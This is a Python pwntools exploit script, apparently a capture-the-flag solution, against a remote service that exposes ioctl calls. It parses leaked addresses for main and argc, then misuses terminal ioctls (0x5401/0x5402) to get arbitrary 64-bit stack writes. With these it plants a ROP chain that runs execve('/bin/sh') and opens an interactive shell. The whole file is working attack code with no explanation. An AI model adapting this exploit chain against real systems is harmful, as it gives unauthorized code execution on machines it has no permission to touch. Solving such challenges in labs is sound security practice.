import argparse
import struct
from pwn import *
from pathlib import Path


print(dir(constants))

# context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

def ioctl(fd, number, *args):
    r.recvuntil("What fd do you want?")
    r.sendline(f"{fd:x}")
    print(f"{fd:x}")
    r.recvuntil("What ioctl do you want to call?")
    r.sendline(f"{number:x}")
    print(f"{number:x}")
    assert len(args) <= 4
    r.recvuntil("How many arguments do you want?")
    r.sendline(f"{len(args):x}")
    print(f"{len(args):x}")

    if len(args) > 0:
        r.recvuntil("What do you want for arg1?")
        r.sendline(f"{args[0]:x}")
        print(f"{args[0]:x}")
    if len(args) > 1:
        r.recvuntil("What do you want for arg2?")
        r.sendline(f"{args[1]:x}")
        print(f"{args[1]:x}")
    if len(args) > 2:
        r.recvuntil("What do you want for arg3?")
        r.sendline(f"{args[2]:x}")
        print(f"{args[2]:x}")
    if len(args) > 3:
        r.recvuntil("What do you want for arg4?")
        r.sendline(f"{args[3]:x}")
        print(f"{args[3]:x}")

    r.recvuntil("ioctl returned 0x")
    result = int(r.recvuntil("\n"), 16)

    return result


r.recvuntil("posix_openpt() returned 0x")
pty = int(r.recvuntil("\n"), 16)
r.recvuntil("main is 0x")
main = int(r.recvuntil(" "), 16)
r.recvuntil("and argc is 0x")
argc = int(r.recvuntil("\n"), 16)

print(f'{pty=:x}')
print(f'{main=:x}')
print(f'{argc=:x}')

"""
main: 0x5555555552f0
leave: 0x5555555555d2
printf: 0x555555555100
printf_data: 0x55555555602a
arg2: 0x7fffffffe618
rip: 0x7fffffffe638
rbp: 0x7fffffffe630
ret: 0x55555555528f
free_stack: 0x7ffffffee5ec
"""

# arg1 = argc + 0x24
arg2 = argc + 0x2c
# rbp = argc - 0x7fffffffe5ec + 0x7fffffffe630
rip = argc - 0x7fffffffe5ec + 0x7fffffffe638

free_stack = (argc - 0x10000) & 0xFFFFFFFFFFFFFFF0

based_main = 0x000013aa
# leave = 0x000013a8
# ret = 0x000013a9
# printf = 0x00001100

def writecursed64(addr, bytes):
    ioctl(3, 0, 0, bytes)
    r.sendlineafter("Do another (0/1)?\n", "1")
    ioctl(3, 0x5402, arg2 - (36 - 8))
    r.sendlineafter("Do another (0/1)?\n", "1")
    ioctl(3, 0x5401, addr - (36 - 8))

# writecursed64(free_stack + 16, main)
# r.sendlineafter("Do another (0/1)?\n", "1")
# writecursed64(free_stack + 8, ret)
# r.sendlineafter("Do another (0/1)?\n", "1")
# writecursed64(free_stack + 0, printf)

data = [
    u64(b"/bin/sh\x00"),
]

chain = [
    main - based_main + 0x00001294, # pop rax ; retn
    59,
    main - based_main + 0x0000129e, # pop rdi ; retn
    free_stack + 50*8,
    main - based_main + 0x0000129c, # pop rsi ; retn
    0,
    main - based_main + 0x0000129a, # pop rdx ; retn
    0,
    main - based_main + 0x00001344, # syscall
]

ioctl(0, 0)

for (i, gadget) in reversed(list(enumerate(chain))):
    r.sendlineafter("Do another (0/1)?\n", "1")
    writecursed64(rip + (8*i), gadget)

for (i, gadget) in reversed(list(enumerate(data))):
    r.sendlineafter("Do another (0/1)?\n", "1")
    writecursed64(free_stack + (8*(i+50)), gadget)

r.sendlineafter("Do another (0/1)?\n", "0")

r.interactive()
